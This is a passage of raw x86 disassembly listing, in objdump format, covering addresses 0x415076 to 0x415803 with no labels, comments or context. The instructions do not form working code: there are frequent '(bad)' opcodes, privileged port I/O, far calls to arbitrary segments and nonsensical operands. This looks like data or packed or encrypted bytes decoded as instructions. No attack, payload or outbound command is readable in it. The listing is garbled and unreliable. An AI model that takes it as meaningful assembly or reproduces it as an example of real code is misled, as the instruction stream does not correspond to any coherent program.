  415076:	inc    edx
  415077:	int    0x1c
  415079:	(bad)  
  41507a:	out    0xa2,al
  41507c:	test   BYTE PTR [esi+0x75],ah
  41507f:	add    BYTE PTR [ecx-0x16],dh
  415082:	mov    ebp,0x48a72c7d
  415087:	mov    eax,ds:0xa1620b1d
  41508c:	add    ch,BYTE PTR [edx]
  41508e:	xor    edx,DWORD PTR [ebx+edi*2-0x2c]
  415092:	ds mov dl,0xfa
  415095:	xchg   edi,eax
  415096:	sbb    eax,0xb74cad9c
  41509b:	cmp    al,0x57
  41509d:	dec    esp
  41509e:	lock mov DWORD PTR [edx-0xdd8ac59],ecx
  4150a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150a6:	retf   0xc406
  4150a9:	jns    0x4150c2
  4150ab:	jb     0x41508b
  4150ad:	mov    ch,0xa0
  4150af:	jp     0x4150d6
  4150b1:	and    al,0xc3
  4150b3:	jp     0x4150f5
  4150b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150b6:	cdq    
  4150b7:	loopne 0x4150eb
  4150b9:	jae    0x415041
  4150bb:	cli    
  4150bc:	mov    ah,0xfb
  4150be:	div    BYTE PTR [eax+0x6e]
  4150c1:	retf   0xa29b
  4150c4:	and    ebx,eax
  4150c6:	xor    ah,0x7c
  4150c9:	cmp    eax,0xa0a20ecb
  4150ce:	adc    al,0x2d
  4150d0:	push   edx
  4150d1:	jnp    0x4150ea
  4150d3:	push   0xffffffd8
  4150d5:	je     0x4150ff
  4150d7:	inc    ecx
  4150d8:	dec    eax
  4150d9:	into   
  4150da:	outs   dx,BYTE PTR ds:[esi]
  4150db:	mov    dl,0x76
  4150dd:	add    bh,0x4e
  4150e0:	cwde   
  4150e1:	rcl    BYTE PTR [edx+0x4c87364d],cl
  4150e7:	pop    eax
  4150e8:	lods   eax,DWORD PTR ds:[esi]
  4150e9:	sub    al,0x7d
  4150eb:	jnp    0x415088
  4150ed:	jbe    0x415072
  4150ef:	popa   
  4150f0:	jle    0x4150dc
  4150f2:	(bad)  
  4150f3:	pop    ebx
  4150f4:	out    0x2b,al
  4150f6:	jl     0x4150e2
  4150f8:	aas    
  4150f9:	(bad)  
  4150fa:	mov    dh,0xe5
  4150fc:	cmp    ecx,DWORD PTR [edx]
  4150fe:	and    al,0xb0
  415100:	icebp  
  415101:	imul   esi,eax,0x29
  415104:	cdq    
  415105:	scas   eax,DWORD PTR es:[edi]
  415106:	sti    
  415107:	or     DWORD PTR [edx+0x13],edi
  41510a:	rcl    BYTE PTR [ecx-0x79e89d8e],1
  415110:	das    
  415111:	aad    0x8c
  415113:	pop    ds
  415114:	sub    dl,ah
  415116:	push   cs
  415117:	mov    BYTE PTR [ebp+0x48],bl
  41511a:	enter  0x86a,0xba
  41511e:	add    ecx,eax
  415120:	xor    eax,0xb93bcdf2
  415125:	cmc    
  415126:	enter  0x4403,0x26
  41512a:	stos   DWORD PTR es:[edi],eax
  41512b:	xchg   BYTE PTR [eax+0x7d1ff3f4],dl
  415131:	xor    ebp,DWORD PTR [ebx+0x799d940]
  415137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415138:	dec    edx
  415139:	daa    
  41513a:	mov    ds:0xc8ebb4cb,eax
  41513f:	pop    eax
  415140:	and    esp,DWORD PTR [eax-0x52]
  415143:	sub    al,0xff
  415145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415146:	loop   0x4151b9
  415148:	call   0x5813:0x68fbd624
  41514f:	push   ebp
  415150:	imul   ebp,DWORD PTR [ebx-0x7b],0x6f
  415154:	and    ebp,DWORD PTR [ebx+eax*4-0x5]
  415158:	bound  esi,QWORD PTR [edi+0x5ec2739]
  41515e:	sbb    esi,DWORD PTR [ecx]
  415160:	xchg   esi,eax
  415161:	scas   al,BYTE PTR es:[edi]
  415162:	xchg   cx,ax
  415164:	(bad)  
  415166:	dec    esi
  415167:	in     eax,dx
  415168:	push   edx
  415169:	and    ebp,DWORD PTR [edx-0x3e]
  41516c:	fbstp  TBYTE PTR ds:0x56c4ab90
  415172:	repnz mov eax,0x6cd75ec
  415178:	or     al,BYTE PTR [ecx+0x577ca517]
  41517e:	jnp    0x41515d
  415180:	xchg   ebp,eax
  415181:	bound  edi,QWORD PTR ss:[ecx+0x47]
  415185:	lods   al,BYTE PTR ds:[esi]
  415186:	call   0x2afc093a
  41518b:	das    
  41518c:	mov    al,0x5a
  41518e:	ss (bad) 
  415190:	clc    
  415191:	inc    esi
  415192:	sub    al,0x94
  415194:	adc    bl,BYTE PTR [esi+0x2e4052a6]
  41519a:	push   ecx
  41519b:	push   cs
  41519c:	mov    cl,0xb1
  41519e:	mov    ch,0xa2
  4151a0:	fisttp DWORD PTR [ebx+0x4f]
  4151a4:	fst    DWORD PTR [edi+0xe3f5bae]
  4151aa:	outs   dx,BYTE PTR ds:[esi]
  4151ab:	mov    eax,0x8991d5e1
  4151b0:	cmp    DWORD PTR [ecx],esi
  4151b2:	jae    0x415211
  4151b4:	lock inc ebp
  4151b6:	rcl    DWORD PTR [edi],0xd2
  4151b9:	mov    ?,WORD PTR [edi]
  4151bb:	sbb    DWORD PTR [eax+0xe8d086a],edi
  4151c1:	inc    eax
  4151c2:	(bad)  
  4151c3:	jl     0x415191
  4151c5:	pop    esp
  4151c6:	inc    ebp
  4151c7:	push   cs
  4151c8:	sub    ebx,edi
  4151ca:	fwait
  4151cb:	stos   BYTE PTR es:[edi],al
  4151cc:	ss xor dl,0xa0
  4151d0:	mov    DWORD PTR [ebp+ecx*8-0x9fac04],esi
  4151d7:	aaa    
  4151d8:	cli    
  4151d9:	jnp    0x415164
  4151db:	inc    edi
  4151dc:	fs dec edi
  4151de:	mov    BYTE PTR [ebp+0x17ab330c],bh
  4151e4:	xor    al,0x3a
  4151e6:	(bad)  
  4151e7:	mov    esi,0xd939f694
  4151ec:	adc    eax,DWORD PTR [edi+eax*8+0x391c655f]
  4151f3:	cwde   
  4151f4:	mov    fs,WORD PTR [eax]
  4151f6:	bound  esp,QWORD PTR [edx+0x5952553e]
  4151fc:	lock ins BYTE PTR es:[edi],dx
  4151fe:	call   0xe6e0:0xfd2bcc66
  415205:	addr16 xchg esp,eax
  415207:	(bad)  
  415208:	in     eax,0x7b
  41520a:	in     al,0xae
  41520c:	xor    BYTE PTR [ecx+0xe],bl
  41520f:	sub    al,0x12
  415211:	pop    edi
  415212:	int    0xa2
  415214:	push   esi
  415215:	inc    esp
  415216:	xchg   esp,eax
  415217:	jmp    0x415257
  415219:	xchg   ecx,eax
  41521a:	pop    esi
  41521b:	and    esp,ebp
  41521d:	jg     0x4151e4
  41521f:	call   0xeb2c:0x3e3d985a
  415226:	inc    ecx
  415227:	inc    esi
  415228:	adc    BYTE PTR ds:0xd8c6cf20,bl
  41522e:	xchg   edx,eax
  41522f:	fstp   DWORD PTR [ebx-0x2c28c7a8]
  415235:	sbb    BYTE PTR [esi],cl
  415237:	shl    DWORD PTR [ecx],1
  415239:	repz or eax,ebx
  41523c:	stos   BYTE PTR es:[edi],al
  41523d:	sbb    al,0x5
  41523f:	push   esi
  415240:	addr16 adc eax,0x63198ec1
  415246:	in     al,dx
  415247:	out    dx,al
  415248:	pop    ecx
  415249:	lock enter 0xcdbb,0xa1
  41524e:	ss push ds
  415250:	ins    BYTE PTR es:[edi],dx
  415251:	jno    0x4151e7
  415253:	jns    0x415208
  415255:	mov    edx,0x39244f10
  41525a:	and    eax,0x2d68aaa5
  41525f:	jne    0x415217
  415261:	test   bh,dh
  415263:	jmp    0xbdc5:0x905518ba
  41526a:	or     ebp,DWORD PTR [eax+edi*4+0x2d55d5b8]
  415271:	jge    0x415201
  415273:	outs   dx,DWORD PTR ds:[esi]
  415274:	call   0x266d06ff
  415279:	adc    eax,0x1c5fe976
  41527e:	xor    edi,DWORD PTR [ebx+ebx*8+0x52a958ad]
  415285:	rcr    DWORD PTR [eax],0x8
  415288:	retf   0x65a0
  41528b:	pop    ds
  41528c:	lock jns 0x415250
  41528f:	outs   dx,BYTE PTR ds:[esi]
  415290:	arpl   WORD PTR [eax-0x41],di
  415293:	mov    esp,0x654e836
  415298:	in     al,dx
  415299:	dec    edi
  41529a:	sub    bh,BYTE PTR [edx+0xa]
  41529d:	inc    edi
  41529e:	inc    edx
  41529f:	aam    0xd1
  4152a1:	(bad)  
  4152a2:	sub    eax,0xa23b7c49
  4152a7:	fstp   st(2)
  4152a9:	or     eax,0x4320481e
  4152ae:	mov    al,ds:0xa45f91ae
  4152b3:	sar    esi,1
  4152b5:	xchg   edi,eax
  4152b6:	in     al,dx
  4152b7:	pop    es
  4152b8:	popa   
  4152b9:	enter  0x92df,0x86
  4152bd:	je     0x415271
  4152bf:	mov    edi,0x2403b264
  4152c4:	jnp    0x4152b9
  4152c6:	jmp    0x7b03ef8b
  4152cb:	repz repnz pop es
  4152ce:	inc    ebx
  4152cf:	mov    ah,0xf1
  4152d1:	or     esi,DWORD PTR [eax-0x31]
  4152d4:	dec    eax
  4152d5:	mov    cl,0x78
  4152d7:	addr16 stc 
  4152d9:	mov    esi,0x6fb614cb
  4152de:	fisubr DWORD PTR [ebp+0x0]
  4152e1:	add    ch,bh
  4152e3:	popa   
  4152e4:	xor    esp,DWORD PTR [esi]
  4152e6:	shr    BYTE PTR [ebx-0x69b1c210],1
  4152ec:	jnp    0x415283
  4152ee:	outs   dx,BYTE PTR ds:[esi]
  4152ef:	stc    
  4152f0:	icebp  
  4152f1:	popa   
  4152f2:	pop    ebx
  4152f3:	dec    eax
  4152f4:	(bad)  
  4152f5:	out    dx,eax
  4152f6:	xor    esp,DWORD PTR [ebx+edx*8-0x74]
  4152fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152fb:	in     al,dx
  4152fc:	je     0x41533c
  4152fe:	out    0x58,eax
  415300:	or     esp,DWORD PTR [ebp+edi*1+0x28b9514]
  415307:	dec    esp
  415308:	mov    cs,WORD PTR [ebp+0x7e05da6d]
  41530e:	sbb    al,0xe
  415310:	add    dh,ah
  415312:	inc    BYTE PTR [edi+0x6c]
  415315:	int    0xdd
  415317:	pop    ebp
  415318:	lods   al,BYTE PTR ds:[esi]
  415319:	pop    ss
  41531a:	popa   
  41531b:	not    BYTE PTR [ecx+0x65]
  41531e:	iret   
  41531f:	jmp    0xc960c1f1
  415324:	xchg   BYTE PTR [edi+0x3828ffe8],bh
  41532a:	or     al,BYTE PTR [eax]
  41532c:	jno    0x415352
  41532e:	or     DWORD PTR [edi+0x7b],0x521cd946
  415335:	(bad)  
  415336:	retf   
  415337:	jecxz  0x415384
  415339:	inc    eax
  41533a:	cld    
  41533b:	xlat   BYTE PTR ds:[ebx]
  41533c:	mul    bl
  41533e:	mov    ds:0x2dad1f29,eax
  415343:	sbb    eax,0x2c6b1c6
  415348:	out    dx,eax
  415349:	rcr    DWORD PTR [esi+0x1e],cl
  41534c:	or     DWORD PTR [edx-0x33],ebp
  41534f:	cmp    esi,edi
  415351:	repz mov ss,WORD PTR [eax-0x1bd9a995]
  415358:	jg     0x41538d
  41535a:	and    bh,bh
  41535c:	sbb    al,0xce
  41535e:	int    0xce
  415360:	pop    eax
  415361:	add    bl,BYTE PTR [edi-0x7dc56ec5]
  415367:	mov    bh,0xca
  415369:	inc    ebx
  41536a:	lods   eax,DWORD PTR ds:[esi]
  41536b:	push   eax
  41536c:	addr16 cdq 
  41536e:	cmp    DWORD PTR [esi-0x6d],edi
  415371:	fidivr DWORD PTR [edx]
  415373:	adc    al,0x55
  415375:	call   0xb47f6699
  41537a:	dec    ecx
  41537b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41537c:	loopne 0x4153ae
  41537e:	dec    edi
  41537f:	bound  ecx,QWORD PTR [ecx-0x70]
  415382:	xchg   esp,eax
  415383:	ficomp DWORD PTR [ebx]
  415385:	pop    eax
  415386:	mov    bh,0x67
  415388:	inc    ebx
  415389:	add    esi,eax
  41538b:	xchg   ecx,eax
  41538c:	cdq    
  41538d:	lahf   
  41538e:	adc    esi,DWORD PTR [edi+0x95bebc7]
  415394:	mov    ds:0x8f32e81d,eax
  415399:	mov    cs,WORD PTR [ebx-0x56]
  41539c:	je     0x4153a9
  41539e:	imul   DWORD PTR [esi]
  4153a0:	push   ecx
  4153a1:	mov    edx,0xaf5e50c3
  4153a6:	mov    esi,0xb201e295
  4153ab:	shr    DWORD PTR [edx+0x129bd18],0xef
  4153b2:	popa   
  4153b3:	push   esp
  4153b4:	sub    ebp,esi
  4153b6:	sbb    eax,edi
  4153b8:	pop    ebp
  4153b9:	add    al,0xc4
  4153bb:	adc    DWORD PTR [ebp-0x44670de6],ecx
  4153c1:	dec    eax
  4153c2:	shl    ecx,1
  4153c4:	repz pusha 
  4153c6:	push   0xe53b9388
  4153cb:	add    BYTE PTR [ecx-0x63],0xab
  4153cf:	and    DWORD PTR [ebp+ecx*1-0x10],ebp
  4153d3:	jo     0x4153bb
  4153d5:	bound  edi,QWORD PTR [edi+eax*4-0x59]
  4153d9:	push   esi
  4153da:	je     0x41541e
  4153dc:	jmp    0x3ae4f2d0
  4153e1:	lock test DWORD PTR ds:0xe499708d,0xbf96bc3e
  4153ec:	jb     0x4153e1
  4153ee:	ret    
  4153ef:	pop    ss
  4153f0:	call   0x9a792b07
  4153f5:	push   eax
  4153f6:	pop    ds
  4153f7:	pop    ecx
  4153f8:	push   eax
  4153f9:	mov    al,0xf8
  4153fb:	sahf   
  4153fc:	or     esi,ebp
  4153fe:	push   ebx
  4153ff:	mov    ch,0x4e
  415401:	jae    0x415413
  415403:	loope  0x4153c2
  415405:	addr16 push ds
  415407:	loop   0x41542d
  415409:	sub    bl,dh
  41540b:	call   0x4014:0x1380eb3f
  415412:	enter  0x3da0,0x7b
  415416:	mov    eax,0x5345ee87
  41541b:	loope  0x4153f7
  41541d:	or     esi,DWORD PTR [esi-0x6]
  415420:	xor    BYTE PTR [eax],ch
  415422:	ret    0x8388
  415425:	xchg   ecx,eax
  415426:	add    al,0x25
  415428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415429:	xchg   ebx,eax
  41542a:	cmp    ebp,0xffffff98
  41542d:	or     al,0xb4
  41542f:	idiv   BYTE PTR [eax+0x33a4d37c]
  415435:	mov    eax,0x829c80b9
  41543a:	daa    
  41543b:	jb     0x4153fc
  41543d:	xchg   bl,dh
  41543f:	mov    ds:0x4744a39a,eax
  415444:	icebp  
  415445:	pop    ebp
  415446:	cmc    
  415447:	mov    dh,dl
  415449:	sub    edx,edx
  41544b:	sti    
  41544c:	repnz dec ebp
  41544e:	xchg   DWORD PTR [ebp-0x52],esp
  415451:	ins    BYTE PTR es:[edi],dx
  415452:	cmp    DWORD PTR [edi],ebx
  415454:	shr    BYTE PTR [ecx],0x3f
  415457:	retf   
  415458:	not    BYTE PTR [ebp+0x1a]
  41545b:	sub    eax,0xad3b0e2b
  415460:	into   
  415461:	mov    edi,0xcb17b7da
  415466:	sub    ah,BYTE PTR [ecx]
  415468:	fisubr WORD PTR [ecx-0x2f]
  41546b:	icebp  
  41546c:	add    al,0xab
  41546e:	pop    ecx
  41546f:	(bad)  
  415470:	outs   dx,BYTE PTR ds:[esi]
  415471:	dec    eax
  415472:	call   FWORD PTR ds:[eax]
  415475:	inc    esp
  415476:	scas   eax,DWORD PTR es:[edi]
  415477:	lods   eax,DWORD PTR ds:[esi]
  415478:	xchg   DWORD PTR [esi+edi*1],ebp
  41547b:	xrelease lock sbb DWORD PTR fs:[ecx],ecx
  415480:	adc    bh,BYTE PTR [edx+0x3a]
  415483:	cld    
  415484:	mov    al,0x21
  415486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415487:	sub    esi,DWORD PTR [eax]
  415489:	mov    ebp,0xe1103f4d
  41548e:	and    BYTE PTR [eax-0x6e],ch
  415491:	jp     0x4154fd
  415493:	pop    ebx
  415494:	stc    
  415495:	out    0x29,eax
  415497:	sbb    al,0x46
  415499:	jle    0x4154b8
  41549b:	out    dx,eax
  41549c:	test   al,0x44
  41549e:	xchg   esp,eax
  41549f:	inc    edx
  4154a0:	(bad)  
  4154a1:	dec    ebx
  4154a2:	or     cl,dl
  4154a4:	popa   
  4154a5:	inc    ebx
  4154a6:	into   
  4154a7:	mov    ecx,0x8f23ee06
  4154ac:	and    dh,ch
  4154ae:	lea    esi,[ebx+0x1b775b7f]
  4154b4:	xor    DWORD PTR [esi],esi
  4154b6:	mov    DWORD PTR [esi],edx
  4154b8:	iret   
  4154b9:	inc    eax
  4154ba:	(bad)  
  4154bb:	scas   eax,DWORD PTR es:[edi]
  4154bc:	pop    esp
  4154bd:	daa    
  4154be:	shl    edx,1
  4154c0:	xchg   edi,eax
  4154c1:	fldcw  WORD PTR [edi+0x45c06d21]
  4154c7:	call   0x736f30ba
  4154cc:	rep lods eax,DWORD PTR ds:[esi]
  4154ce:	int3   
  4154cf:	(bad)  
  4154d0:	xor    eax,0x3c113cb3
  4154d5:	les    edi,FWORD PTR [esi]
  4154d7:	dec    esi
  4154d8:	adc    edi,ecx
  4154da:	lds    ebx,FWORD PTR [edx+edi*4-0x25012e02]
  4154e1:	mov    cl,0x14
  4154e3:	out    0xd9,eax
  4154e5:	std    
  4154e6:	dec    ebp
  4154e7:	cmp    DWORD PTR [edx-0x32],ecx
  4154ea:	aam    0x5e
  4154ec:	mov    esp,0xae715af
  4154f1:	enter  0xdc69,0x5c
  4154f5:	xor    BYTE PTR [ebx-0x31],bh
  4154f8:	loope  0x415548
  4154fa:	sbb    al,0x53
  4154fc:	jne    0x415536
  4154fe:	and    BYTE PTR [ebx+ebx*8-0x167bfe9a],ah
  415505:	xor    al,0xfd
  415507:	fnstcw WORD PTR [eax-0x5696d830]
  41550d:	loop   0x415515
  41550f:	pop    ds
  415510:	arpl   WORD PTR [ebp-0x52340685],bp
  415516:	jmp    0x9a61e927
  41551b:	push   esi
  41551c:	(bad)  
  41551d:	sbb    al,0x6c
  41551f:	sahf   
  415520:	div    BYTE PTR [ebp+0x7e]
  415523:	inc    ebx
  415524:	sar    dh,0xf4
  415527:	xchg   DWORD PTR [ecx-0x76],edi
  41552a:	call   DWORD PTR [ecx]
  41552c:	xacquire xchg BYTE PTR [esi-0x59],ah
  415530:	out    0xec,al
  415532:	inc    eax
  415533:	addr16 cdq 
  415535:	pusha  
  415536:	into   
  415537:	test   eax,0xeb9e95c6
  41553c:	add    ch,BYTE PTR [ecx-0x42]
  41553f:	aam    0x3
  415541:	or     edi,DWORD PTR [ecx+0xd38873d]
  415547:	test   eax,0xe632c15c
  41554c:	retf   
  41554d:	ja     0x415577
  41554f:	push   ebx
  415550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415551:	scas   al,BYTE PTR es:[edi]
  415552:	(bad)  
  415554:	or     DWORD PTR [edx+edi*1],esi
  415557:	outs   dx,BYTE PTR ds:[esi]
  415558:	xlat   BYTE PTR ds:[ebx]
  415559:	leave  
  41555a:	pop    ss
  41555b:	into   
  41555c:	mov    al,ds:0x4acae18f
  415561:	(bad)  
  415562:	jne    0x4155b1
  415564:	push   ss
  415565:	or     edi,DWORD PTR [ebp-0x21]
  415568:	push   edi
  415569:	jne    0x4155e2
  41556b:	jg     0x4155e5
  41556d:	mov    al,0xbb
  41556f:	aas    
  415570:	jg     0x415576
  415572:	leave  
  415573:	mov    al,ds:0x7edc518f
  415578:	lahf   
  415579:	test   eax,0xd130f090
  41557e:	dec    ebx
  41557f:	cmp    al,0xe7
  415581:	mov    eax,ds:0xd70e3a7d
  415586:	sub    dh,dh
  415588:	push   0x17c04b34
  41558d:	push   cs
  41558e:	adc    DWORD PTR [esi+0x14],eax
  415591:	xchg   edi,eax
  415592:	pusha  
  415593:	cmc    
  415594:	adc    DWORD PTR [edx],esi
  415596:	xor    edi,eax
  415598:	les    ebx,FWORD PTR [esi]
  41559a:	add    dl,BYTE PTR [esi]
  41559c:	push   ecx
  41559d:	or     al,0x8
  41559f:	push   ss
  4155a0:	or     ah,BYTE PTR [eax-0x74]
  4155a3:	test   eax,0x75d0c914
  4155a8:	je     0x4155f9
  4155aa:	adc    edx,ebp
  4155ac:	hlt    
  4155ad:	xchg   DWORD PTR [esi+0x6c],eax
  4155b0:	int    0x8e
  4155b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155b3:	push   esi
  4155b4:	shl    DWORD PTR [edi+0x3],1
  4155b7:	sbb    al,0xc6
  4155b9:	or     eax,DWORD PTR [edx-0x42]
  4155bc:	jp     0x415595
  4155be:	adc    DWORD PTR [ecx+0x27d183a3],esi
  4155c4:	sti    
  4155c5:	scas   eax,DWORD PTR es:[edi]
  4155c6:	sub    DWORD PTR [edi-0x6acbefd2],eax
  4155cc:	fwait
  4155cd:	pop    esp
  4155ce:	(bad)  
  4155cf:	repnz pop eax
  4155d1:	gs and al,0x79
  4155d4:	bound  ebx,QWORD PTR [eax]
  4155d6:	push   0xcb3f8489
  4155db:	pop    es
  4155dc:	xchg   DWORD PTR es:[ecx-0x78004af4],ebx
  4155e3:	jge    0x4155b2
  4155e5:	and    eax,0xc7fdbb1c
  4155ea:	add    al,0xed
  4155ec:	mov    bh,0x73
  4155ee:	mov    dh,BYTE PTR [ecx+eiz*8-0x6d]
  4155f2:	icebp  
  4155f3:	retf   0xebb8
  4155f6:	in     eax,0x96
  4155f8:	ret    0x483f
  4155fb:	cmp    bh,BYTE PTR [esi]
  4155fd:	iret   
  4155fe:	pop    esp
  4155ff:	mov    eax,ds:0x1562a74f
  415604:	in     eax,0x5e
  415606:	xchg   edi,eax
  415607:	sub    al,0x73
  415609:	mov    BYTE PTR [esi],dh
  41560b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41560c:	sbb    BYTE PTR [ebp-0x18],ah
  41560f:	mov    ebp,0x7d4745c8
  415614:	sbb    DWORD PTR [esp+ecx*2-0x3269360e],0x14
  41561c:	xor    BYTE PTR [esi+ebp*8-0x2b],0x48
  415621:	(bad)  
  415622:	sub    DWORD PTR [ebp-0x30],ecx
  415625:	nop
  415626:	or     BYTE PTR [ebx],dh
  415628:	icebp  
  415629:	adc    eax,0x49a137cf
  41562e:	(bad)
  415631:	aas    
  415632:	(bad)  
  415633:	mov    al,0x6
  415635:	call   0x31b6a0e8
  41563a:	test   al,0x32
  41563c:	sbb    DWORD PTR [ecx],esi
  41563e:	inc    ebp
  41563f:	sti    
  415640:	or     al,0x90
  415642:	sub    edi,DWORD PTR [ecx+0x1d]
  415645:	pushf  
  415646:	cs sub al,0xb1
  415649:	ds push ss
  41564b:	dec    esi
  41564c:	sub    bl,BYTE PTR [ebp-0x1]
  41564f:	fdivr  QWORD PTR [eax]
  415651:	ret    
  415652:	xchg   ebx,eax
  415653:	adc    eax,0x102dea20
  415658:	and    BYTE PTR [eax-0x2],0x74
  41565c:	jle    0x4156c6
  41565e:	xchg   edi,eax
  41565f:	imul   BYTE PTR [ebp+0x28]
  415662:	add    BYTE PTR cs:[ebx-0x1d],ah
  415666:	sub    al,0x4a
  415669:	inc    ecx
  41566a:	cmp    al,0x8
  41566c:	fwait
  41566d:	inc    ebp
  41566e:	dec    ebp
  41566f:	xchg   ecx,eax
  415670:	fsub   QWORD PTR [edi-0x366e41b9]
  415676:	test   BYTE PTR [ebx],bl
  415678:	inc    ebp
  415679:	je     0x4156b5
  41567b:	popf   
  41567c:	mov    bh,0x75
  41567e:	aam    0xed
  415680:	pop    esi
  415681:	mov    ds:0xba900453,al
  415686:	iret   
  415687:	aas    
  415688:	push   es
  415689:	push   ss
  41568a:	aas    
  41568b:	mov    BYTE PTR [ebx-0x4b71ccad],ch
  415691:	push   edx
  415692:	push   esp
  415693:	lods   eax,DWORD PTR ds:[esi]
  415694:	mov    BYTE PTR [si+0x40b3],dh
  415699:	cld    
  41569a:	xchg   edi,eax
  41569b:	arpl   WORD PTR [eax-0x7b054640],di
  4156a1:	outs   dx,BYTE PTR ds:[esi]
  4156a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a3:	cdq    
  4156a4:	or     al,BYTE PTR [edx+0x5]
  4156a7:	jo     0x41571b
  4156a9:	mov    ebx,0xe7bc1b30
  4156ae:	push   0x733de127
  4156b3:	push   esp
  4156b4:	shl    DWORD PTR [eax-0x7],1
  4156b7:	push   ebx
  4156b8:	xor    DWORD PTR [esi+edi*4],esi
  4156bb:	dec    eax
  4156bc:	loope  0x4156fd
  4156be:	mov    al,0xcb
  4156c0:	ret    
  4156c1:	push   ds
  4156c2:	sbb    esi,DWORD PTR [ebx+0x10]
  4156c5:	repnz aad 0xca
  4156c8:	into   
  4156c9:	out    0x7,eax
  4156cb:	(bad)  
  4156cc:	call   FWORD PTR [eax+0x24]
  4156cf:	add    BYTE PTR [edi],cl
  4156d1:	push   ss
  4156d2:	call   0x51038cc4
  4156d7:	add    bl,BYTE PTR [ebx]
  4156d9:	pop    esi
  4156da:	pop    ds
  4156db:	xchg   ebp,eax
  4156dc:	push   ds
  4156dd:	int3   
  4156de:	stos   DWORD PTR es:[edi],eax
  4156df:	mov    ds:0xcddc15bc,eax
  4156e4:	enter  0x4768,0xba
  4156e8:	adc    BYTE PTR [ebx+0x46],bl
  4156eb:	fs inc esp
  4156ed:	jno    0x4156d4
  4156ef:	adc    ah,dh
  4156f1:	or     DWORD PTR [ecx-0x7],edx
  4156f4:	dec    ebx
  4156f5:	pop    esp
  4156f6:	shl    BYTE PTR [ebx-0x734a3608],cl
  4156fc:	cmp    ch,BYTE PTR [esi+0x18d2170f]
  415702:	inc    DWORD PTR [eax-0x28d3ca1c]
  415708:	call   0x55ce:0x817f6335
  41570f:	mov    esp,0xf1651618
  415714:	mov    ds:0x31dd7d25,al
  415719:	jne    0x4156ce
  41571b:	xchg   edi,eax
  41571c:	ins    BYTE PTR es:[edi],dx
  41571d:	mov    ecx,0xd2c102f
  415722:	popf   
  415723:	je     0x41575f
  415725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415726:	in     eax,dx
  415727:	fidiv  WORD PTR [edx+0x4d]
  41572a:	(bad)  
  41572b:	btc    DWORD PTR [eax],eax
  41572e:	les    ecx,FWORD PTR [eax]
  415730:	add    al,0x15
  415732:	push   edi
  415733:	sub    eax,0x1a17be1c
  415738:	scas   al,BYTE PTR es:[edi]
  415739:	mov    al,0x2
  41573b:	xchg   BYTE PTR [eax-0x4b],ch
  41573e:	push   0x2a
  415740:	sub    cl,bl
  415742:	cmp    dh,BYTE PTR [ebx-0x5324e812]
  415748:	fist   WORD PTR [edi-0x4]
  41574b:	dec    edi
  41574c:	mov    bh,0xa0
  41574e:	sbb    al,0x2f
  415750:	add    al,bh
  415752:	addr16 icebp 
  415754:	add    BYTE PTR [esi-0x55],al
  415757:	in     al,0x81
  415759:	adc    al,0x49
  41575b:	xor    ebx,edx
  41575d:	aaa    
  41575e:	dec    eax
  41575f:	(bad)  
  415761:	in     eax,0xf2
  415763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415764:	in     al,dx
  415765:	push   ecx
  415766:	out    0x7c,eax
  415768:	pop    es
  415769:	inc    ebx
  41576a:	inc    eax
  41576b:	mov    BYTE PTR [esi+0x6aaeb18c],cl
  415771:	sbb    ecx,DWORD PTR [eax]
  415773:	mov    ch,0xf2
  415775:	imul   DWORD PTR [ebx]
  415777:	jne    0x415722
  415779:	stos   DWORD PTR es:[edi],eax
  41577a:	mov    ds:0xd041b44c,eax
  41577f:	xchg   esi,eax
  415780:	dec    ecx
  415781:	pusha  
  415782:	add    BYTE PTR [edi+0x7462a43a],ch
  415788:	cdq    
  415789:	daa    
  41578a:	sahf   
  41578b:	or     edi,ebx
  41578d:	push   esp
  41578e:	mov    ah,0x24
  415790:	aad    0x85
  415792:	sbb    DWORD PTR [ebp+0x282bc1a5],esi
  415798:	popf   
  415799:	ins    DWORD PTR es:[edi],dx
  41579a:	out    dx,al
  41579b:	add    edi,DWORD PTR [edx]
  41579d:	and    ebp,DWORD PTR fs:[edx-0x53]
  4157a1:	mov    esp,0x2c831542
  4157a6:	ja     0x41577a
  4157a8:	xor    bh,BYTE PTR [ebx-0x2a]
  4157ab:	push   ds
  4157ac:	mov    bh,0xd9
  4157ae:	in     eax,dx
  4157af:	ja     0x415745
  4157b1:	jns    0x415813
  4157b3:	stc    
  4157b4:	repz and ch,BYTE PTR [ebx]
  4157b7:	out    dx,al
  4157b8:	pop    esi
  4157b9:	data16 xchg BYTE PTR [eax+eax*4],dl
  4157bd:	or     edi,ebx
  4157bf:	mov    esp,0xc7c088ed
  4157c4:	iret   
  4157c5:	xlat   BYTE PTR ds:[ebx]
  4157c6:	into   
  4157c7:	ret    
  4157c8:	scas   eax,DWORD PTR es:[edi]
  4157c9:	bound  eax,QWORD PTR [edx-0x4b]
  4157cc:	cdq    
  4157cd:	push   esi
  4157ce:	inc    ebx
  4157cf:	mov    ds:0xbf9830b1,eax
  4157d4:	xor    DWORD PTR [edi],esp
  4157d6:	push   eax
  4157d7:	call   0x22ac062d
  4157dc:	test   BYTE PTR [edx+0x7c5eac6b],0xb9
  4157e3:	stc    
  4157e4:	lods   al,BYTE PTR ds:[esi]
  4157e5:	std    
  4157e6:	mov    ds:0xdd9bb99,eax
  4157eb:	or     DWORD PTR [edi+0x71b29185],ecx
  4157f1:	jge    0x4157fa
  4157f3:	sbb    ecx,DWORD PTR [esp+ebx*1-0x2]
  4157f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157f8:	and    BYTE PTR [ebp-0x4e],al
  4157fb:	aaa    
  4157fc:	shr    bl,1
  4157fe:	arpl   WORD PTR [edi],ax
  415800:	sahf   
  415801:	mov    bh,0x97
  415803:	dec    esp
